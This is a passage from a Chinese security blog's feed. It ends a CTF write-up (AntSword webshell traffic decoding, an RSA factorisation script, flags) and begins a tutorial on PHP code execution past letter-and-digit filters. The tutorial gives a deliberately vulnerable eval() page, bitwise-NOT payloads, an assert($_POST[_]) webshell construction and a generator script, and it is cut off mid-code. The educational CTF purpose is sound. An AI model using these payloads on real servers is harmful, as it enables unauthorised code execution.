title="WebShell2"><p>解码出来同样也是蚁剑享有的@ini_set头</p><p>所以hacker应该是上传了一个webshell到服务器，然后使用蚁剑连接执行的操作</p><p>所以我们对其传参的值需要从第三位开始进行base64 decode（也就是删除前两个字符进行解码）</p><p>所以我们一个个找POST请求，并且对传参的值进行解码即可</p><p>最后在分组202处找到压缩包的密码：CrazyKFCvivo50</p><img src="/2022/12/03/AuroraCTF-Write-Up/WebShell2-6.png" class title="WebShell2"><p>然后解压缩即可</p><p><strong>Aurora{Antsword_1s_n0thing_mor3_7han_that}</strong></p><h2><span id="crypto"> Crypto</span></h2><h3><span id="latex喵"> latex喵</span></h3><img src="/2022/12/03/AuroraCTF-Write-Up/lateX.jpg" class title="latex"><p>latex的每个符号都是由 \一串英文 构成的</p><p>找出构成的符号的英文，取其首字母即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\frac \lambda \alpha \gamma &#123;\cup \alpha \theta \forall \lambda \angle \Gamma</span><br></pre></td></tr></table></figure><p>所以 flag{catflaG}</p><h3><span id="boxlins-calculator"> boxlin’s calculator</span></h3><p>嗯，真就直接nc 然后算50个简单的加法就好了（雾</p><p>记得准备好计算器</p><h3><span id="easy_hash"> easy_hash</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接找一个md5在线解密一个个解码</span><br><span class="line">雾</span><br></pre></td></tr></table></figure><h3><span id="doublefermat"> DoubleFermat</span></h3><p>费马分解（</p><p>其实可以偷偷去用yafu或者factordb分解大数</p><p>可以将n分解成p、q、r、s</p><p>那么phi= (p-1)(q-1)(r-1)(s-1)</p><p>然后就是跑脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">n=<span class="number">108299033965406365561943421701029190713946501560891630763244580970876141418060260848778356857818721003436668631051400046179714981563966629274135856263153393451778069603328236097645480852770563989641923335589213862076364231145680800763901480686502776051597843698725745250490425410650791537590877762849466754206792810298344723222757628527518527264424314398114603721700244387477600040173682904446101720469681389347684578169792444049955729491371539347527279510563843274956478643209577823959527009597138462178858908131459847477377873722809756286442989867841939264973938882747031165883664081728483968786444940130754090961440237029991537678198779446572379955612212432298032927533340075560342822842145491942842616840755357720456094746128021240483607459457623006697140665289210877036207570817593250015026853022025281118097723071897439283253998814746302023470665795337363626017807575053924858839475153327626709665036887169655539664145700068948907541640999554647851646028559453557061575683476442175156969842706373750319278039080406149444513435322207503611280827839170184405510258770955233545645043225793645367427485248583195703459681129854324595394957504455110811076379721049379749687264501324278652077596148357272587301352719972975920356014689</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">66282640807724405518602152114651879396246399255101507349038984047328959352691526384322744768659223247334455265432088028572041267042739221831533163642845861607636601193315832251590920339394500463075340397307285539327999953887797257215690304189880652964252216730150032533125189722147047967308850948061617857067650084515935365816313305482220299962756712272432126983038693515098931341954074787185153265911930069239124196604571305060210229630878593348542829381366929767819633918796746367100098078605770730971792477677209132590933799007758134578199207989520721360808705952397752948494796730262506568874816001910275456823816338446048730520807309148166369726421371597405903017279967140423776263708058900596532049999358296071238547707056598409574824286805346221039445037989664132260965906540515127261405823017822082554131040927683563314789126862678639503366941046116526326931102784127218794970747035858802637234772860038892015022384208812143488934424907981571536806616031983586579576340972689776331101818627661035148519372288555606365821757056616114258213545574963383005835374672572357290479551752690678352298990065015686456011474166705064061262970654778008504711084690127162113691996060192655389528709191383408755044112132008663979770115918</span></span><br><span class="line">p=<span class="number">102013147086798080895209742244518090847906106236142646014934325493710363574238703524315388371630739109670866042564046496943726208676219184893623664143217403973853860578059247609380135994555880547303897734242545104929531238022729301651096704798124263294407141524106901717388225046982567446431588847391306594837</span></span><br><span class="line">q=<span class="number">102013147086798080895209742244518090847906106236142646014934325493710363574238703524315388371630739109670866042564046496943726208676219184893623664143217403973853860578059247609380135994555880547303897734242545104929531238022729301651096704798124263294407141524106901717388225046982567446431588847391303593773</span></span><br><span class="line">r=<span class="number">102013147086798080895209742244518090847906106236142646014934325493710363574238703524315388371630739109670866042564046496943726208676219184893623664143217403973853860578059247609380135994555880547303897734242545104929531238022729301651096704798124263294407141524106901717388225046982567446431588847391305594673</span></span><br><span class="line">s=<span class="number">102013147086798080895209742244518090847906106236142646014934325493710363574238703524315388371630739109670866042564046496943726208676219184893623664143217403973853860578059247609380135994555880547303897734242545104929531238022729301651096704798124263294407141524106901717388225046982567446431588847391304593793</span></span><br><span class="line"></span><br><span class="line">f=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)*(s-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,gmpy2.invert(e,f),n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;Aurora&#123;Just_do_f3rm4t_f4ct0rizat1on_tw1c3&#125;&#x27;</span><br></pre></td></tr></table></figure><hr><p>嗯，连带看提示+百度搜索会做的就这么多了，果然我还是太菜了Orz</p><p>题目质量很好，明年再来~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本萌新第二次参加的比赛，毕竟是新生赛，各位师傅都很手下留情了qwq。&lt;/p&gt;
&lt;p&gt;我主要做web方向，也做一点简单的Misc和Crypto方向的题，反正就是不看提示和百度基本上做不出来的那种qwq&lt;/p&gt;</summary>
    
    
    
    <category term="CTF WriteUp" scheme="http://example.com/categories/CTF-WriteUp/"/>
    
    
    <category term="SQL_Injection" scheme="http://example.com/tags/SQL-Injection/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>简单看看无数字字母RCE</title>
    <link href="http://example.com/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/"/>
    <id>http://example.com/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/</id>
    <published>2022-11-19T04:54:29.000Z</published>
    <updated>2023-03-12T09:43:56.846Z</updated>
    
    <content type="html"><![CDATA[<p>这两天一直在看的玩意，原来我已经菜到啥也不会了，qwq。</p><span id="more"></span><h2><span id="简单引入"> 简单引入</span></h2><p>命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不合要求啊&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你啥都没输入啊&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以自己用PHP Study搭一个来测试</span></span><br></pre></td></tr></table></figure><p>跑一个过滤字符的php看看能用啥字符</p><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/1.png" class title="qwq"><p>把数字和字母都过滤了，但是大多数符号是能够使用的，所以来看看这个要怎么绕过捏</p><h2><span id="1url取反绕过php7"> 1.url取反绕过（PHP7）</span></h2><p>在PHP7中能够直接进行url取反绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//output:%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure><p>结果如下</p><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/2.png" class title="qwq"><p>如果是PHP5的话需要多几步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;_POST&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//output:%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%A0%AF%B0%AC%AB</span></span><br><span class="line">    <span class="variable">$_</span> = ~<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>;<span class="variable">$__</span>=~<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>;<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/4.png" class title="qwq"><h2><span id="2汉字取反"> 2.汉字取反</span></h2><p>Orz，这个多少带点离谱，通过对汉字取反得到想要的英文字符</p><p>参考大佬给出的生成器（雾），可以通过汉字跑出想要的英文字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span 